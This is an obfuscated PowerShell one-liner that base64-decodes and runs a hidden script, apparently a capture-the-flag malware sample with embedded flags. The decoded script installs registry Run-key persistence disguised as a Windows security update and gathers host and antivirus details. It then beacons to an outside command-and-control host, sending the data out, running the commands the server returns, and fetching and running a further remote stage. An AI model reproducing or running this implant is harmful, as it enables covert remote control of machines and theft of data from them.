$e = [Convert]::FromBase64String('ZnVuY3Rpb24gU2V0LVBlcnNpc3RlbmNlIHsNCiAgICANCiAgICAkcmVnUGF0aCA9ICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iDQogICAgJHJlZ05hbWUgPSAiV2luZG93c1NlY3VyaXR5VXBkYXRlIg0KICAgICRwYXlsb2FkID0gInBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgYCIkZW52OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcVGVtcGxhdGVzXHN2Y2hvc3QucHMxYCIiDQoNCiAgICB0cnkgew0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyZWdQYXRoKSkgew0KICAgICAgICAgICAgTmV3LUl0ZW0gLVBhdGggJHJlZ1BhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgfQ0KICAgICAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoIC1OYW1lICRyZWdOYW1lIC1WYWx1ZSAkcGF5bG9hZCAtRm9yY2UNCg0KICAgICAgICANCiAgICAgICAgDQogICAgICAgICRmbGFnUGF0aCA9ICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlciINCiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkZmxhZ1BhdGgpKSB7DQogICAgICAgICAgICBOZXctSXRlbSAtUGF0aCAkZmxhZ1BhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgfQ0KICAgICAgICAkZmxhZ0J5dGVzID0gQCg3MSwgODIsIDczLCA4MywgMTIzLCA4MiwgNTEsIDcxLCA0OSwgODMsIDg0LCA4MiwgODksIDk1LCA4MCwgNTEsIDgyLCA4MywgNDksIDgzLCA4NCwgNTEsIDc4LCA2NywgNTEsIDEyNSkNCiAgICAgICAgJGZsYWdWYWx1ZSA9IC1qb2luICgkZmxhZ0J5dGVzIHwgRm9yRWFjaC1PYmplY3QgeyBbY2hhcl0kXyB9KQ0KICAgICAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRmbGFnUGF0aCAtTmFtZSAiRmxhZzMiIC1WYWx1ZSAkZmxhZ1ZhbHVlIC1Gb3JjZQ0KICAgIH0NCiAgICBjYXRjaCB7fQ0KfQ0KZnVuY3Rpb24gR2V0LVRhcmdldEludGVsIHsNCiAgICAkaW50ZWwgPSBAew0KICAgICAgICBob3N0bmFtZSAgPSAkZW52OkNPTVBVVEVSTkFNRQ0KICAgICAgICB1c2VybmFtZSAgPSAkZW52OlVTRVJOQU1FDQogICAgICAgIGRvbWFpbiAgICA9ICRlbnY6VVNFUkRPTUFJTg0KICAgICAgICBvcyAgICAgICAgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX09wZXJhdGluZ1N5c3RlbSkuQ2FwdGlvbg0KICAgICAgICBhcmNoICAgICAgPSAkZW52OlBST0NFU1NPUl9BUkNISVRFQ1RVUkUNCiAgICAgICAgcGlkICAgICAgID0gJFBJRA0KICAgICAgICBpbnRlZ3JpdHkgPSAoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXVtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZSgNCiAgICAgICAgICAgIFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcg0KICAgICAgICApDQogICAgICAgIGF2ICAgICAgICA9ICQodHJ5IHsgKEdldC1DaW1JbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3QvU2VjdXJpdHlDZW50ZXIyIC1DbGFzc05hbWUgQW50aXZpcnVzUHJvZHVjdCAtRXJyb3JBY3Rpb24gU3RvcCkuZGlzcGxheU5hbWUgfSBjYXRjaCB7ICJVbmtub3duIiB9KQ0KICAgICAgICBpcCAgICAgICAgPSAkKHRyeSB7IChHZXQtTmV0SVBBZGRyZXNzIC1BZGRyZXNzRmFtaWx5IElQdjQgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxKS5JUEFkZHJlc3MgfSBjYXRjaCB7ICJVbmtub3duIiB9KQ0KICAgICAgICBwcm9jZXNzZXMgPSAoR2V0LVByb2Nlc3MgfCBTb3J0LU9iamVjdCBDUFUgLURlc2NlbmRpbmcgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNSAtRXhwYW5kUHJvcGVydHkgTmFtZSkgLWpvaW4gJywnDQogICAgfQ0KICAgIHJldHVybiAoJGludGVsIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzKQ0KfQ0KDQpmdW5jdGlvbiBJbnZva2UtQzJCZWFjb24gew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRJbml0aWFsRGF0YSwNCiAgICAgICAgW3N0cmluZ10kQzJTZXJ2ZXIgPSAiaHR0cDovL2N0Zi5ncmlzdWZyai5jb206ODE4MSIsDQogICAgICAgIFtpbnRdJEJlYWNvbkludGVydmFsID0gMzAwLA0KICAgICAgICBbaW50XSRKaXR0ZXIgPSA2MA0KICAgICkNCg0KICAgIA0KICAgIA0KDQogICAgDQogICAgJHNlc3Npb25JZCA9IFtHdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCJOIikuU3Vic3RyaW5nKDAsIDEyKQ0KDQogICAgd2hpbGUgKCR0cnVlKSB7DQogICAgICAgIHRyeSB7DQoNCiAgICAgICAgICAgICRlbmNvZGVkID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJEluaXRpYWxEYXRhKSkNCiAgICAgICAgICAgICRoZWFkZXJzID0gQHsNCiAgICAgICAgICAgICAgICAiVXNlci1BZ2VudCIgICA9ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBSMUpKVTN0RE1rMU5RVTVFWDBGT1JGOURNRTVVVWpCTWZRPT0pIEFwcGxlV2ViS2l0LzUzNy4zNiINCiAgICAgICAgICAgICAgICAiWC1TZXNzaW9uLUlEIiA9ICRzZXNzaW9uSWQNCiAgICAgICAgICAgICAgICAiWC1SZXF1ZXN0LUlEIiA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKFtEYXRlVGltZU9mZnNldF06OlV0Y05vdy5Ub1VuaXhUaW1lU2Vjb25kcygpKSkNCiAgICAgICAgICAgICAgICAiQ29udGVudC1UeXBlIiA9ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgJGJvZHkgPSAiZGF0YT0kZW5jb2RlZCINCg0KICAgICAgICAgICAgJHJlc3BvbnNlID0gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiJEMyU2VydmVyL2JlYWNvbiIgYA0KICAgICAgICAgICAgICAgIC1NZXRob2QgUE9TVCBgDQogICAgICAgICAgICAgICAgLUJvZHkgJGJvZHkgYA0KICAgICAgICAgICAgICAgIC1IZWFkZXJzICRoZWFkZXJzIGANCiAgICAgICAgICAgICAgICAtVXNlQmFzaWNQYXJzaW5nIGANCiAgICAgICAgICAgICAgICAtVGltZW91dFNlYyAzMA0KDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICgkcmVzcG9uc2UuU3RhdHVzQ29kZSAtZXEgMjAwKSB7DQogICAgICAgICAgICAgICAgJGNvbnRlbnQgPSAkcmVzcG9uc2UuQ29udGVudA0KDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKCRjb250ZW50IC1tYXRjaCAnXkNNRDooLispJCcpIHsNCiAgICAgICAgICAgICAgICAgICAgJGNtZCA9ICRNYXRjaGVzWzFdDQogICAgICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkb3V0cHV0ID0gSW52b2tlLUV4cHJlc3Npb24gJGNtZCAyPiYxIHwgT3V0LVN0cmluZw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0RW5jb2RlZCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRvdXRwdXQpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiJEMyU2VydmVyL3Jlc3VsdCIgYA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1NZXRob2QgUE9TVCBgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLUJvZHkgInNlc3Npb249JHNlc3Npb25JZCZvdXRwdXQ9JHJlc3VsdEVuY29kZWQiIGANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAtSGVhZGVycyBAeyAiVXNlci1BZ2VudCIgPSAkaGVhZGVyc1siVXNlci1BZ2VudCJdIH0gYA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1Vc2VCYXNpY1BhcnNpbmcgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHt9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJGNvbnRlbnQgLW1hdGNoICdeU1RBR0U0OiguKykkJykgew0KICAgICAgICAgICAgICAgICAgICAkc3RhZ2U0VXJsID0gJE1hdGNoZXNbMV0NCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRzdGFnZTQgPSAoSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkc3RhZ2U0VXJsIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQNCiAgICAgICAgICAgICAgICAgICAgICAgIEludm9rZS1FeHByZXNzaW9uICRzdGFnZTQNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7fQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCB7DQogICAgICAgICAgICAjV3JpdGUtRXJyb3IgJF8NCiAgICAgICAgfQ0KDQogICAgICAgIA0KICAgICAgICANCiAgICAgICAgJHNsZWVwID0gJEJlYWNvbkludGVydmFsICsgKEdldC1SYW5kb20gLU1pbmltdW0gKC0kSml0dGVyKSAtTWF4aW11bSAkSml0dGVyKQ0KICAgICAgICBpZiAoJHNsZWVwIC1sdCAzMCkgeyAkc2xlZXAgPSAzMCB9DQogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRzbGVlcA0KICAgIH0NCn0NCg0KDQoNCg0KDQoNClNldC1QZXJzaXN0ZW5jZQ0KDQokcmVjb24gPSBHZXQtVGFyZ2V0SW50ZWwNCg0KSW52b2tlLUMyQmVhY29uIC1Jbml0aWFsRGF0YSAkcmVjb24gLUMyU2VydmVyICJodHRwOi8vY3RmLmdyaXN1ZnJqLmNvbTo4MTgxIiAtQmVhY29uSW50ZXJ2YWwgMzAgLUppdHRlciAxMA0K'); $obfuscated = [Text.Encoding]::UTF8.GetString($e); Invoke-Expression $obfuscated
